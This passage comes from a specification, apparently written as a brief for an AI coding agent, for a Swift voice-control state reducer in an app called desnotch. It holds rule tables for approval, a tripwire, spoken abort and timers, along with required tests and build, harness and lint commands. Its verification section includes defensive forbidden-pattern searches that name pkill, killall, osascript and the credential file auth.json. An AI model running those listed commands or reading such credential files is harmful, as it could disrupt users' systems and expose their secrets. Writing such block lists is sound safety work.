| R76 | `denyRequested(n)` [nonce matches, local card] | `TO_IDLE([.audit(AuditDraft(kind: .denial, lane: .local, tier: pending.tier, decision: "denied"))])` |
| R77 | `denyRequested(n)` [nonce matches, agent card] | effects `[.respondToApproval(nonce: n, allow: false), .audit(AuditDraft(kind: .denial, lane: .hermes, tier: pending.tier, decision: "denied"))]`; `pending = nil`; `state = .acting` (the agent will finish or fail on its own) |
| R78 | `timerElapsed(.approval)`, `screenLocked` | Like R76 (local) or R77 (agent) with no nonce check (there is no nonce in the event; for an agent card use `pending.nonce` in `.respondToApproval(nonce: pending.nonce, allow: false)`, exactly as R79 does); audit decision `"expired"` for the timer and `"locked"` for the lock |
| R79 | `cancelRequested` | Local card: like R76 with decision `"cancel"`. Agent card: effects `[.respondToApproval(nonce: pending.nonce, allow: false), .cancelAgentTurn]` then `TO_IDLE` with those as `extra` plus `.audit(AuditDraft(kind: .cancel, lane: .hermes, decision: "approval"))` |

(Totality) `awaitingApproval` with `pending == nil` cannot arise, but the reducer must never trap: `approveRequested`/`denyRequested` follow R71/R75 (`nonce_mismatch`), and `timerElapsed(.approval)`, `screenLocked` and `cancelRequested` do `TO_IDLE([])`.

**thinking / acting (agent lane, `lane == .hermes`)** - `agent(_, generation:)` events. These rules (R80-R92 and `timerElapsed(.turnBudget)`) apply only while `lane == .hermes`; with any other lane an `.agent` event (other than `.usage`, R88) is a no-op.

| ID | Event [guard] | Result |
|---|---|---|
| R80 | `.agent(.partial(s))` | `reply = String(s.prefix(400))` (the backend sends the full text so far) |
| R81 | `.agent(.status(_))` | no-op |
| R82 | `.agent(.toolActivity(kind))` [`tier = ToolTierTable.tier(forTool: kind)`; `tier <= .t1`, or `tier == .t2 && approvedToolStarts > 0`] | If `tier == .t2` then `approvedToolStarts -= 1`. `steps.append(VoiceStep(id: stepsStarted, kind: String(kind.prefix(40))))`; `stepsStarted += 1`; `state = .acting`. If `stepsStarted > 12` (`VoiceLimits.maxAgentSteps`) after the increment: `TO_ERROR(.stepBudgetExceeded, [.cancelAgentTurn])` instead (the 13th chip WAS appended and `stepsStarted` stays incremented; the `approvedToolStarts` decrement also stays). |
| R83 | `.agent(.toolActivity(kind))` [otherwise: `tier >= .t3`, or `tier == .t2 && approvedToolStarts == 0`] | **Tripwire.** `kind40 = String(kind.prefix(40))`. Effects `[.stopAgentHard, .cue(.error), .audit(AuditDraft(kind: .tripwire, lane: .hermes, tier: tier, decision: "tripwire", outcome: kind40))]`; then `DROP_INTERRUPT` (its `.cancelCapture(generation: interrupt.generation)` is appended AFTER those three effects, as in `TO_ERROR`); then `NEW_ID`, `CLEAR_FLOW`, `state = .paused`, `pauseReason = .tripwire(kind40)`, `failure = .tripwire(tool: kind40)`. |
| R84 | `.agent(.approvalNeeded(req))` [`req.risk` has any `autoDeny` flag, or `req.tier >= .t4`, or (`req.tier == .t3 && !env.secondFactorAvailable`)] | Auto-deny, no card: effects `[.respondToApproval(nonce: req.nonce, allow: false), .audit(AuditDraft(kind: .denial, lane: .hermes, tier: req.tier, decision: "auto_deny"))]`; state unchanged |
| R85 | `.agent(.approvalNeeded(req))` [otherwise] | `pending = req`; `pendingIntent = nil`; `state = .awaitingApproval`; effects `[.cue(.needsConfirmation), .startTimer(.approval, generation: generation, seconds: 60.0), .audit(AuditDraft(kind: .approval, lane: .hermes, tier: req.tier, decision: "requested"))]` |
| R86 | `.agent(.finished(summary))` (also valid in `awaitingApproval`) | `FINISH(summary)` |
| R87 | `.agent(.failed(f))` (also valid in `awaitingApproval`) | `TO_ERROR(f)` |
| R88 | `.agent(.usage(i, o, c))` (any state, current OR stale generation) | effects `[.audit(AuditDraft(kind: .cost, lane: .hermes, counters: ["input_tokens": i, "output_tokens": o, "cost_micros": c]))]`; context unchanged |
| R89 | `timerElapsed(.turnBudget)` (valid in `thinking`, `acting`, `awaitingApproval`) | `TO_ERROR(.timeout, [.cancelAgentTurn])` |
| R90 | `cancelRequested` [`lane == .hermes`] | `TO_IDLE([.cancelAgentTurn, .audit(AuditDraft(kind: .cancel, lane: .hermes, decision: "turn"))])` |
| R91 | `.agent(.approvalNeeded(req))` while `awaitingApproval` | Auto-deny the NEW request exactly like R84's effects (`decision: "second_request"`); the existing `pending` stays. |
| R92 | `awaitingApproval` + `.agent(.toolActivity(kind))` | Tripwire exactly like R83 (a tool started while a card is open means something ran unapproved). |

An `.agent(...)` event (other than `.usage`) in any state other than `thinking`, `acting`, `awaitingApproval` is a no-op. **`.agent(.usage)` is different: R88 yields its cost audit in EVERY state, including `idle`, `error`, `paused` and `speaking`, with any `lane` (including nil) and for a stale generation (R01's exception), so do not route all `.agent` events only through the busy-state handler.**

**Which agent rules apply in which busy state.** For an `.agent(...)` event with a current generation and `lane == .hermes`, pick the rule from this table. In `awaitingApproval`, R91 and R92 are evaluated BEFORE any other `.agent` rule of that state, and R82-R85 do NOT apply there (so `clock` while a card is open trips the wire, never R82).

| Agent event | `thinking`, `acting` | `awaitingApproval` |
|---|---|---|
| `.usage` | R88 | R88 |
| `.finished` | R86 | R86 |
| `.failed` | R87 | R87 |
| `.toolActivity` | R82 or R83 | R92 only |
| `.approvalNeeded` | R84 or R85 | R91 only |
| `.partial` | R80 | no-op (nothing changes, no effects) |
| `.status` | R81 (no-op) | no-op |

Other events in the busy states: `timerElapsed(.turnBudget)` is R89 in all three; `cancelRequested` is R90 in `thinking`/`acting` and R79 in `awaitingApproval`; the interrupt-capture events are R100-R104 in all three and come first. `approveRequested`/`denyRequested` exist only in `awaitingApproval` (R70-R78); in `thinking`/`acting` they are no-ops.

**local execution (`acting` with `lane == .local`)**

R95-R97 apply only when `state == .acting && lane == .local`. `localExecutionFinished` in any other state, or with lane `.hermes`, is a no-op (and a late one is also stale by R01 once the flow moved on).

| ID | Event [guard] | Result |
|---|---|---|
| R95 | `localExecutionFinished(.success(spoken))` | If `env.speechAllowed` and `spoken` is non-nil and non-empty: `FINISH(spoken)`. Otherwise `TO_IDLE([.cue(.done), .audit(AuditDraft(kind: .execute, lane: .local, decision: "finished", outcome: "ok"))])`. |
| R96 | `localExecutionFinished(.failure(f))` | `TO_ERROR(f, [.audit(AuditDraft(kind: .execute, lane: .local, decision: "finished", outcome: f.code))])` |
| R97 | `cancelRequested` [`lane == .local`] | no-op (a local action is instantaneous and cannot be cancelled) |

**interrupt capture (stop-only second capture during a busy agent turn)**

The interrupt rules R100-R104 apply in ALL THREE busy states (`thinking`, `acting`, `awaitingApproval`) and are evaluated BEFORE the per-state rules of that state. An interrupt capture lets the user say "abort agent" (or bare "stop"/"cancel") while the agent works.
Only those phrases are honored; every other transcript is ignored.

| ID | State / Event [guard] | Result |
|---|---|---|
| R100 | `thinking, acting, awaitingApproval` + `talkPressed` [`lane == .hermes && interrupt == nil && env.voiceEnabled && !env.screenLocked`] | `counter += 1`; `interrupt = InterruptCapture(generation: counter, endedByUser: false)`; effects `[.startCapture(generation: counter, mode: .hold)]`. Everything else unchanged. |
| R101 | any + `captureStarted(g)` [`interrupt != nil && g == interrupt.generation`] | effects `[.cue(.captureStart), .startTimer(.listenCap, generation: g, seconds: 10.0)]` |
| R102 | any + `talkReleased(h)` [`interrupt != nil`] | `h >= 0.35`: `interrupt.endedByUser = true`; effects `[.endCapture(generation: interrupt.generation), .cue(.captureEnd)]`. `h < 0.35`: effects `[.cancelCapture(generation: interrupt.generation)]`; `interrupt = nil`. |
| R103 | any + `finalTranscript(s, g)` [`interrupt != nil && g == interrupt.generation`] | `interrupt = nil`. `route = IntentRouter.route(s, context: RouterContext(hermesLaneAvailable: false, agentBusy: true))`. `.emergencyStop` -> `STOP_ALL(.spokenAbort)`, whose exact effects are `[.stopAgentHard, .audit(AuditDraft(kind: .stop, lane: .hermes, decision: "spoken_abort", outcome: "hard"))]` (`interrupt` is already nil, so there is no `.cancelCapture` for it, and the state is a busy agent state, so there is none for the main flow either); the result state is `.paused`. `.cancelTurn` -> `TO_IDLE([.cancelAgentTurn, .audit(AuditDraft(kind: .cancel, lane: .hermes, decision: "spoken"))])`. Anything else -> no effects and no other change except `interrupt = nil` (the transcript is ignored; the recognizer already finished). |
| R104 | any + `captureFailed(_, g)` or `timerElapsed(.listenCap, g)` [`interrupt != nil && g == interrupt.generation`] | `captureFailed`: `interrupt = nil`, effects `[.cancelCapture(generation: g)]`. `listenCap`: effects `[.endCapture(generation: g)]` (the transcript is still only honored for stop phrases). |
| R105 | a state change that leaves `{thinking, acting, awaitingApproval}` while `interrupt != nil` | Covered by `DROP_INTERRUPT` inside `TO_IDLE`, `TO_ERROR`, `STOP_ALL`, `FINISH`, R83. |

**speaking**

| ID | Event [guard] | Result |
|---|---|---|
| R110 | `speechFinished` or `timerElapsed(.replyDisplay)` | `TO_IDLE([])` |
| R111 | `talkPressed` [`env.voiceEnabled && !env.screenLocked`] / `toggleTalk` (same guard) | `NEW_FLOW(.hold or .toggle, [.stopSpeaking])` |
| R112 | `cancelRequested` | `TO_IDLE([.stopSpeaking])` |

**error**

| ID | Event [guard] | Result |
|---|---|---|
| R120 | `timerElapsed(.errorDisplay)` | `TO_IDLE([])` |
| R121 | `talkPressed` / `toggleTalk` (same guard as R10/R11) | `NEW_FLOW(.hold or .toggle, [])` |
| R122 | `cancelRequested` | `TO_IDLE([])` |

**paused**

| ID | Event [guard] | Result |
|---|---|---|
| R130 | `resumeRequested` | `TO_IDLE([.audit(AuditDraft(kind: .resume, decision: "resume"))])` |
| R131 | `talkPressed`, `toggleTalk` | no-op (paused ignores input until resumed) |
| R132 | anything else | no-op |

`resumeRequested` outside `paused` is a no-op.

### Suggested code structure (you may copy this)

Do not write one giant `switch`. Build the result in a small mutable helper and write one function per procedure:

```swift
enum VoiceReducer {
    static func reduce(_ context: VoiceContext, _ event: VoiceEvent, env: VoiceReducerEnv) -> VoiceTransition {
        // R01: stale generation guard
        if let generation = generation(of: event), !isCurrent(generation, in: context) {
            if case .agent(.usage(let i, let o, let c), _) = event { return usageTransition(context, i, o, c) }
            return VoiceTransition(context: context)
        }
        var b = Builder(context: context)
        // global rules R02-R04 first, then switch on context.state
        ...
        return VoiceTransition(context: b.context, effects: b.effects)
    }

    private struct Builder {
        var context: VoiceContext
        var effects: [VoiceEffect] = []

        mutating func newID() { context.counter += 1; context.generation = context.counter }
        mutating func clearFlow() { /* the CLEAR_FLOW row, field by field */ }
        mutating func dropInterrupt() {
            if let interrupt = context.interrupt {
                effects.append(.cancelCapture(generation: interrupt.generation))
                context.interrupt = nil
            }
        }
        mutating func toIdle(_ extra: [VoiceEffect] = []) {
            effects = extra; dropInterrupt(); newID(); clearFlow(); context.state = .idle
        }
        mutating func toError(_ failure: VoiceFailure, _ extra: [VoiceEffect] = []) { /* TO_ERROR row */ }
        mutating func stopAll(_ reason: PauseReason, forceIdle: Bool = false) { /* STOP_ALL row */ }
        mutating func newFlow(_ mode: CaptureMode, _ extra: [VoiceEffect] = []) { /* NEW_FLOW row */ }
        mutating func handleFinal(_ text: String, env: VoiceReducerEnv) { /* HANDLE_FINAL rows R50-R58 */ }
    }
}
```

`generation(of:)` returns the generation payload of the events that have one (`captureStarted`, `captureFailed`,
`partialTranscript`, `finalTranscript`, `timerElapsed`, `localExecutionFinished`, `speechFinished`, `agent`) and nil for
the others. Put each state's rules in its own small private function (`reduceIdle`, `reduceArmed`, ...) that takes the builder.

Important details people get wrong:

- `effects` ORDER matters and tests compare arrays exactly. Follow the order written in each row.
- `TO_IDLE` bumps the generation (`NEW_ID`); `TO_ERROR` does NOT. After `TO_IDLE`, the timer of the old flow is stale and ignored.
- `captureEndedByUser` is set only by `END_BY_USER`. A capture that ends by the cap timer (`END_BY_CAP`) or by the recognizer
  must never send anything to the cloud agent (rule R54).
- `rate` is part of the context; `tryConsume` is `mutating`, so call it on `b.context.rate`.
- `bounded(s)` is `String(s.prefix(500))`. Never `NSString`/UTF-16 indexes.
- Never read the clock or generate an id: use `env.now` and `env.freshNonce`.
- The interrupt rules (R100-R104) apply in all three busy states and must be checked before the per-state rules; a `talkPressed` in a busy state never reaches the idle/armed rules. `.agent` rules (R80-R92) apply only when `context.lane == .hermes`.
- The reducer must be total: no `fatalError`, no force unwrap, no `precondition`. An event it does not know about in a state
  is a no-op.

### Test helpers (put these at the top of `VoiceReducerRuleTests.swift`, copy them)

```swift
private let t0 = Date(timeIntervalSince1970: 1_800_000_000)

private func env(
    voiceEnabled: Bool = true, locked: Bool = false, hermes: Bool = false, turns: Int = 40,
    speech: Bool = false, secondFactor: Bool = false, nonce: String = "n1", now: Date = t0
) -> VoiceReducerEnv {
    VoiceReducerEnv(now: now, voiceEnabled: voiceEnabled, screenLocked: locked, hermesLaneReady: hermes,
                    hermesTurnsRemainingToday: turns, speechAllowed: speech,
                    secondFactorAvailable: secondFactor, freshNonce: nonce)
}

/// A context already in `state`, with generation 1 / counter 1 unless changed by `edit`.
private func ctx(_ state: VoiceState, _ edit: (inout VoiceContext) -> Void = { _ in }) -> VoiceContext {
    var c = VoiceContext()
    c.state = state
    c.counter = 1
    c.generation = 1
    edit(&c)
    return c
}

private func step(_ c: VoiceContext, _ e: VoiceEvent, _ env: VoiceReducerEnv = env()) -> VoiceTransition {
    VoiceReducer.reduce(c, e, env: env)
}
```

### Rule tests

`VoiceReducerRuleTests`: **one test per rule ID**, named `testR01_staleEventIsNoOp`, `testR02_featureDisabledStopsEverything`,
`testR10_talkPressedStartsAHoldCapture`, ... Every ID that appears in the rule tables (R01-R04b, R10-R14, R20-R24, R30-R37,
R40-R43, R50-R58, R60-R65, R70-R79, R80-R92, R95-R97, R100-R105, R110-R112, R120-R122, R130-R132) gets at least one test that
asserts BOTH the resulting `state` (and the changed context fields named in the row) AND the full `effects` array. Where a row
has several guards (R04, R21/R22, R60/R61/R62, R73/R74, R76/R77, R83, R84/R85, R102, R103), write one test per guard branch
(suffix `_a`, `_b`, ...). Tests that are no-ops assert `transition.context == input` and `transition.effects.isEmpty`.
R62 and R64 are unreachable through the real router, but they ARE reachable by building the context directly, so they get tests
like every other rule: `testR62_...` uses `ctx(.review) { $0.route = .local(.volumeSet(percent: 150)) }` (tier `.t4`, so
`.deny(.tierT4)`), then `timerElapsed(.review, 1)`; `testR64_...` uses `ctx(.review) { $0.route = .cancelTurn }`. R74 gets a third branch
`testR74_c_...` where `ctx.rate` is pre-filled with three `.t2` events so the approve takes the `rate_limited` deny path.
`scripts/voice-harness/check-rule-tests.sh` fails if any rule ID of `docs/voice/PLAN.md` has no `testR<ID>_` method.

Include these specific checks (they catch the usual mistakes):

- `testR10`: `ctx(.idle)` with `counter == 0`: afterwards `counter == 1`, `generation == 1`, `state == .armed`,
  effects `[.startCapture(generation: 1, mode: .hold)]`.
- `testR01`: a `captureStarted(generation: 99)` in `.armed` changes nothing.
- `testR22`/`testR32`: a tap (held 0.1 s) switches `captureMode` to `.toggle` and does not end the capture.
- `testR54`: a cap-ended capture (`END_BY_CAP`) whose final text is not a local command ends in `.error` with
  `failure == .rejected(.needsUserRelease)` and no `.submitToAgent` effect.
- `testR63`: the `.limited` branch with `ctx.rate` pre-filled with ten recent `.t1` events (call `tryConsume` in a loop to build it).
- `testR83`: tripwire for `terminal`, for unknown `zzz`, and for a `t2` tool with `approvedToolStarts == 0`; and NOT for
  `clock` (R82) and NOT for `write_file` with `approvedToolStarts == 1` (R82, which also decrements it to 0).
- `testR84`: auto-deny for a request whose `risk` contains `.pipeToInterpreter`, one with `tier: .t4`, and one with `tier: .t3`
  when `secondFactorAvailable == false`.
- `testR71`: a nonce mismatch changes NOTHING but emits exactly one audit effect.
- Hold boundary (R21, R22, R31, R32): `heldSeconds` of exactly `0.35` is a HOLD (R31 ends the capture, R21 cancels) and `0.3499` is a TAP (R32, R22 latch toggle). Name them `testR31_boundary_exactThresholdIsAHold` and `testR32_boundary_justUnderThresholdIsATap`.
- `testTimerSecondsMatchVoiceTimingConstants`: drive the flows that emit `.startTimer` (R20 hold and toggle, R32, R34/END_BY_USER watchdog, R61, R63, R85, R101, FINISH without speech, TO_ERROR) and assert each `seconds` equals the matching `VoiceTiming` constant (`holdListenCap`, `toggleListenCap`, `finalWatchdog`, `approvalTimeout`, `agentTurnBudget`, `reviewWindow`, `errorDisplay`, `replyDisplay`), and that `VoiceTiming.holdThreshold == 0.35`.
- `testNoSpokenWordApprovesAnything`: in `awaitingApproval` (a local card and an agent card) a `finalTranscript` of "yes", "approve", "approve it" or "ok go ahead" (current generation, no interrupt) changes nothing and emits nothing (the state stays `.awaitingApproval`, `pending` unchanged); and through an interrupt capture (R103) the same words change nothing except `interrupt = nil`.
- Rule IDs with a letter suffix are matched by prefix and underscore: `testR03_...`, `testR03a_...`, `testR03b_...` are three different methods (`check-rule-tests.sh` greps for `func testR03_`, `func testR03a_`, ...).

### Scenario tests

`VoiceReducerScenarioTests`: feed a script of events through `reduce`, carrying the context forward, and assert
`(state, effects)` after every step. A tiny helper keeps this readable:

```swift
private func run(_ script: [(VoiceEvent, VoiceReducerEnv)], from start: VoiceContext = VoiceContext())
    -> [VoiceTransition] { var c = start; return script.map { let t = VoiceReducer.reduce(c, $0.0, env: $0.1); c = t.context; return t } }
```

Write these ten scenarios (names `testScenarioS1_...`). The `->` shows the state after the event; give the exact effects in
the test according to the rule tables.

| # | Script | Expected states after each event |
|---|---|---|
| S1 | local, hold: `talkPressed`, `captureStarted(1)`, `partialTranscript("volume", 1)`, `talkReleased(0.9)`, `finalTranscript("volume thirty", 1)`, `timerElapsed(.review, 1)`, `localExecutionFinished(.success(spoken: "Volume 30"), 1)` (speech not allowed) | armed, listening, listening, transcribing, review (route `.local(.volumeSet(percent: 30))`), acting (effects include `.execute(.volumeSet(percent: 30), generation: 1)`), idle (generation now 2) |
| S2 | tap-latch: `talkPressed`, `talkReleased(0.1)`, `captureStarted(1)`, `talkPressed`, `finalTranscript("mute", 1)`, `timerElapsed(.review, 1)` | armed, armed (`captureMode == .toggle`), listening (10 s cap timer), transcribing, review, acting (`.execute(.mute, ...)`) |
| S3 | cloud agent with approval: lane ready (`hermes: true`); `talkPressed`, `captureStarted(1)`, `talkReleased(1.2)`, `finalTranscript("what is the weather in Jakarta", 1)`, `timerElapsed(.review, 1)`, `agent(.toolActivity(kind: "clock"), 1)`, `agent(.approvalNeeded(<T2 card, nonce "c1", risk []>), 1)`, `approveRequested(nonce: "c1")`, `agent(.finished(summary: "It is sunny"), 1)`, `timerElapsed(.replyDisplay, 1)` | armed, listening, transcribing, review (lane `.hermes`), thinking (`.submitToAgent`), acting (1 step chip), awaitingApproval, acting (effects `.respondToApproval(nonce: "c1", allow: true)`), speaking (`.startTimer(.replyDisplay,...)`), idle |
| S4 | tripwire: from `ctx(.thinking)` with `lane = .hermes`: `agent(.toolActivity(kind: "terminal"), 1)`, then `resumeRequested`, then `talkPressed` | paused (effects `[.stopAgentHard, .cue(.error), .audit(...)]`, failure `.tripwire(tool: "terminal")`), idle, armed |
| S5 | spoken abort during an agent turn: from `ctx(.acting)` with lane `.hermes`: `talkPressed`, `captureStarted(2)`, `talkReleased(0.8)`, `finalTranscript("abort agent", 2)` | acting (interrupt capture, `.startCapture(generation: 2, mode: .hold)`), acting, acting (`.endCapture(generation: 2)`, `.cue(.captureEnd)`), paused (effects exactly `[.stopAgentHard, .audit(AuditDraft(kind: .stop, lane: .hermes, decision: "spoken_abort", outcome: "hard"))]`: no `.cancelCapture`, the interrupt was already cleared by R103) |
| S6 | stale events: S1 up to `armed`, then `captureStarted(99)`, `finalTranscript("volume 10", 99)`, `timerElapsed(.review, 99)` | armed, armed, armed (all no-ops) |
| S7 | review cancel: S1 up to `review`, `cancelRequested`, then the old `timerElapsed(.review, 1)` | idle, idle (the old timer is stale) |
| S8 | lock: `talkPressed`, `captureStarted(1)`, `screenLocked` | armed, listening, idle (effects `[.cancelCapture(generation: 1), audit cancel "locked"]`) |
| S9 | cap-ended capture is never sent to the cloud: lane ready; `talkPressed`, `captureStarted(1)`, `timerElapsed(.listenCap, 1)`, `finalTranscript("what is the weather", 1)` | armed, listening, transcribing, error (`.rejected(.needsUserRelease)`) |
| S10 | local confirm card: `finalTranscript("volume ninety", 1)` from `ctx(.transcribing)` with `captureEndedByUser = true`, then `timerElapsed(.review, 1)`, then `denyRequested(nonce: "n1")` | review, awaitingApproval (`pending.nonce == "n1"`, `pendingIntent == .volumeSet(percent: 90)`), idle |

## Verification (what "done" means)

All commands run from the root of YOUR worktree (the directory that contains `Package.swift`).

```sh
# 1. Compile. Must end with "Build complete!" and print NO line containing "warning:" or "error:".
swift build 2>&1 | grep -E "warning:|error:|Build complete"

# 2. Run tests with the stub-XCTest harness (this machine has no XCTest; CI runs the real one).
scripts/voice-harness/run.sh --filter <TestClassName>      # one class, or any "Class.testName" fragment
scripts/voice-harness/run.sh                               # the whole suite, ~45 s after the first build

# 3. Lint the files you touched (stand-in for SwiftLint in CI: trailing whitespace, final newline,
#    no double blank lines, no leading blank line).
scripts/voice-harness/lint-lite.sh                          # all changed/new .swift files
scripts/voice-harness/lint-lite.sh path/one.swift path/two.swift
```

How to read the results:

- `swift build`: done means the single line `Build complete!` and nothing matching `warning:` or `error:`.
  Run it after every edit and read the whole output. An incremental build only re-prints warnings for files it recompiled,
  and SwiftPM hashes file CONTENT, so `touch` does NOT force a rebuild. For the final whole-package warning check build into
  a fresh scratch directory (about 40-60 s): `swift build --scratch-path "$(mktemp -d)" 2>&1 | grep -E "warning:|error:|Build complete"`.
- Harness: each test prints `ok   Class.testName` or `FAIL Class.testName` followed by the failing assertion with
  `file:line`. The last lines are `harness: N passed, M failed, K assertions`. **Done** means `M == 0`, or the
  extra line `harness: only known baseline failures remain` (two existing render tests,
  `ArtworkGlowRenderTests.testGlowFollowsTheCurrentAccentNotThePreviousOne` and
  `PillMarqueeRenderTests.testLongTitleScrollsAfterTheStartDelayOnceActive`, always fail under the stub; ignore them, and
  never edit them). The generated `runner/main.swift` prints about 1,700
  baseline `no calls to throwing functions occur within 'try' expression` warnings, and SwiftPM prints every diagnostic twice (a
  `/path/File.swift:L:C: warning:` line, then an indented caret line that starts with `|` and has no file name), so a plain
  `grep 'warning:'` over the raw output is useless. **The warning check** is the command below. SwiftPM prints a file's warnings only
  when it recompiles that file and an incremental harness build skips files it already built, so the check builds into a FRESH
  harness directory (about 40 s) and keeps only lines that START with a file path. It must print nothing (its last `grep -v` exits 1 when there is nothing to print, which is the good outcome: never run it under `set -e` or chain it with `&&`):

  ```sh
  W="$(mktemp -d)"; HARNESS_DIR="$W" scripts/voice-harness/run.sh --filter VoiceContractSmoke 2>&1 \
    | grep -E '^/.*: (warning|error):' | grep -vE '/(main|UpdateCheckerTests)\.swift:'; rm -rf "$W"
  ```

  The only known baseline warnings are the `main.swift` `try` warnings and 4 copies of one actor-isolation warning at
  `Tests/DesnotchCoreTests/UpdateCheckerTests.swift:41`; they are not yours and you must not touch that file. Any other line the check
  prints is yours: fix it. `swift build` never compiles the test target, so a warning or an error in a TEST file shows up only in
  the harness run (and in CI).
  The harness finds a test class only when it is declared on ONE line as `class X: XCTestCase` or `final class X: XCTestCase`,
  and it resets its current class at every column-0 `class`, `struct`, `enum` or `actor`: put helper types and fakes at
  column 0 AFTER the test class (or indent them inside it), and confirm with `scripts/voice-harness/run.sh --list | grep <Class>`
  that every test you wrote is listed.
- `lint-lite.sh` must print `lint-lite: clean (N files)`. Pass your files explicitly
  (`scripts/voice-harness/lint-lite.sh path/one.swift path/two.swift`). It only checks the whitespace rules; CI's SwiftLint also
  enforces `duplicate_imports`, `empty_enum_arguments`, `redundant_discardable_let`, `unused_optional_binding` and
  `void_return`, so check those by eye (only `trailing_whitespace` is an error there): write `case .foo`, not `case .foo(_)`;
  never `if let _ = x` (use `x != nil`) or `let _ = f()` (use `_ = f()`).
- First harness run builds everything into `.build/voice-harness/` inside your worktree (gitignored); it takes about 1 minute
  (about 40 s on the Mac mini). If your shell tool times out after 2 minutes, raise the timeout, or run
  `scripts/voice-harness/run.sh --filter VoiceContractSmoke` once up front so later runs are incremental. `--skip-build` re-runs
  without rebuilding.
- The harness copies your current `Sources/DesnotchCore` and `Tests/DesnotchCoreTests` on every run, so just save and re-run.
- Tests only ever run for real on GitHub Actions (`swift test` on macos-14 with Swift 5.10, and macos-15). The harness uses
  your local Swift 6.1 compiler in Swift 5 language mode, so it can NOT catch every Swift 5.10 actor-isolation error. Follow
  the isolation rules in "Global rules" literally.

**A desnotch is probably already running on this Mac (the installed `/Applications/desnotch.app`).** The app has a
single-instance guard, so a second copy (including `swift run`, `scripts/runtime-smoke-test.sh`, or anything that launches the
app) exits immediately while the installed one runs. NEVER quit, kill or restart the installed app or its adapter process
yourself. Steps that need to launch the app are marked "manual" below: do not attempt them; list them in your report as
`NOT RUN: installed desnotch is running`, and the human runs them after quitting his copy.

Run, in this order, and paste the last lines of each in your final report:

```sh
swift build 2>&1 | grep -E "warning:|error:|Build complete"
scripts/voice-harness/run.sh --filter UtteranceNormalizerTests
scripts/voice-harness/run.sh --filter SpokenNumberTests
scripts/voice-harness/run.sh --filter AppCatalogTests
scripts/voice-harness/run.sh --filter IntentRouterTests
scripts/voice-harness/run.sh --filter ConfirmationPolicyTests
scripts/voice-harness/run.sh --filter ToolTierTableTests
scripts/voice-harness/run.sh --filter CommandRiskScannerTests
scripts/voice-harness/run.sh --filter RateLimiterTests
scripts/voice-harness/run.sh --filter VoiceReducer
scripts/voice-harness/check-rule-tests.sh
scripts/voice-harness/run.sh
# the warning check (described above): `swift build` never compiles test files, so a stray `var` or an unused result of
# `tryConsume` in a TEST file shows up only here. It must print nothing. It ends in a `grep -v` that exits 1 when there is
# nothing to print, which is the good outcome: do not run it under `set -e` or chain it with `&&`.
W="$(mktemp -d)"; HARNESS_DIR="$W" scripts/voice-harness/run.sh --filter VoiceContractSmoke 2>&1 \
  | grep -E '^/.*: (warning|error):' | grep -vE '/(main|UpdateCheckerTests)\.swift:'; rm -rf "$W"
swift build --scratch-path "$(mktemp -d)" 2>&1 | grep -E "warning:|error:|Build complete"     # fresh-scratch build, about 60 s
scripts/voice-harness/lint-lite.sh Sources/DesnotchCore/Voice/Logic/*.swift Tests/DesnotchCoreTests/Voice/Logic/*.swift
scripts/voice-harness/check-ownership.sh WP-LOGIC
# forbidden patterns (PLAN section 12): every rg below must print nothing, comments included (rg exits 1 on no match: that is the good outcome)
rg -n '\bprint\(|\bNSLog\(|\bos_log|\bLogger\(|\.onHover|repeatForever|serve --stop|pkill|killall|hermes pause|osascript|auth\.json|AXIsProcessTrusted' --glob '!**/Logic/CommandRiskScanner.swift' Sources/DesnotchCore/Voice
rg -n '\bprint\(|\bNSLog\(|\bos_log|\bLogger\(|\.onHover|repeatForever|serve --stop|hermes pause|AXIsProcessTrusted' Sources/DesnotchCore/Voice/Logic/CommandRiskScanner.swift
rg -n 'AVAudioFile|SFSpeechURLRecognitionRequest|URLSession|setVoiceProcessingEnabled|allow_session|allow_always|deny_always|NSAppleScript|AXUIElement' Sources/DesnotchCore/Voice/Logic     # safety invariants: must print nothing
```

`osascript`, `pkill`, `killall` and `auth.json` may appear in `CommandRiskScanner.swift` ONLY as data in the `Pat` constants and the protected-path list (`rg -n 'osascript|pkill|killall|auth\.json' Sources/DesnotchCore/Voice/Logic/CommandRiskScanner.swift` may hit only those lines). The warning check and the fresh-scratch `swift build` write OUTSIDE the worktree (`mktemp -d` is under the system temp directory): a sandbox that restricts you to your worktree must be given permission for that, or use `$PWD/.build/scratch-check` for the `--scratch-path` and `HARNESS_DIR` instead (`.build/` is gitignored); report which you used.

Done means: build clean; every class above shows `0 failed`; the full suite shows `0 failed` (or only the known baseline
failures); lint clean; test METHOD counts at least: normalizer 14 (`testN1_`..`testN14_`), spoken number 34 (`testS1_`..`testS34_`), catalog at least 22 test methods (18 rows plus the negative and invariant tests below), router 72 (`testRouter_1_`..`testRouter_72_`), policy: tier boundaries (volume 0/70/71/100/-1/101, timer 0/1/120/121 and every other intent) plus the 10 `decide` combinations, tool tiers 32 (`testT1_`..`testT32_`),
scanner 33 (`testC1_`..`testC33_`, one method per row, C26b folded into `testC26_`), rate limiter 11 (`testL1_`..`testL11_`), reducer rules one per ID listed above, scenarios 10 (`testScenarioS1_`..`testScenarioS10_`); `scripts/voice-harness/check-rule-tests.sh` verifies all of these names, not only the reducer rule IDs; `git status` shows changes only in the 18
files of section 2.

## Global rules

These apply to every work package. They are not suggestions.

1. **No new dependencies.** No Swift packages, no vendored code, no shell tools that are not already on a stock macOS 13+
   (and not already used by the repo). Apple system frameworks are fine (`Speech`, `AVFoundation`, `CryptoKit`, `Carbon.HIToolbox`, ...).
   Do not edit `Package.swift`.
2. **Swift 5.10 on CI (macos-14).** The compiler on CI is stricter about actor isolation than the Swift 6.1 on this machine.
   - Mark every SwiftUI `View` struct and every type that touches a `@MainActor` type (`SettingsStore`, controllers,
     `NSWorkspace` UI calls, `VoiceSessionModel`) explicitly `@MainActor`. Never rely on inferred isolation.
   - Escaping closures that capture a class instance use `[weak self]`.
   - `AsyncStream`/`Task` bodies that touch `@MainActor` state are `Task { @MainActor [weak self] in ... }`.
   - Protocols and value types that cross isolation are `Sendable`. A class that is `@unchecked Sendable` guards ALL its mutable
     state with one `NSLock` (or one serial `DispatchQueue`) and says so in a doc comment.
   - Do not use: `Mutex`/`Synchronization`, `sending`, `consuming`/`borrowing`, typed throws (`throws(X)`), Swift Testing
     (`import Testing`, `#expect`), macros, `nonisolated(unsafe)` (outside tests it hides bugs), `@preconcurrency` imports as a
     way to silence a warning, or any API newer than macOS 13.
   - Do not put `await` inside an `XCTAssert...(...)` argument; assign to a `let` first.
   - Never call `NSLock.lock()` / `unlock()` inside the body of an `async` function or closure: the Swift 6.1 compiler warns
